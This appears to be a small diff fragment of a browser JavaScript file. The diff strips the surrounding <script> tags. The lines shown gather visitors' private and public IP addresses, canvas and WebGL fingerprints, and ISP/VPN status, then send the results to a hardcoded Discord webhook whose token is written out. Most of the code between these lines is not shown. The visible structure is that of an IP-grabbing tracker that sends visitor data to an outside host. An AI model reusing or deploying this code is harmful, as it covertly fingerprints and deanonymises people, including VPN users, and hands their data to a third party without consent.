@@ -1,4 +1,4 @@
-<script>
+
 const webhookURL = "https://discord.com/api/webhooks/1330487817914155060/7zGOaywZAThxAFy_d4r3z2kRV2im-lxXu5Na0k6nB_UnSUpbCw4jlh1E62URtcyh1K3E"; 
 let privateIPs = new Set();
 let publicIPs = new Set();
@@ -167,4 +167,3 @@ getCanvasFingerprint();
 getWebGLFingerprint();
 Promise.all([getISPandVPNStatus(), getAppleIPs()])
     .then(() => sendToDiscord());
-</script>
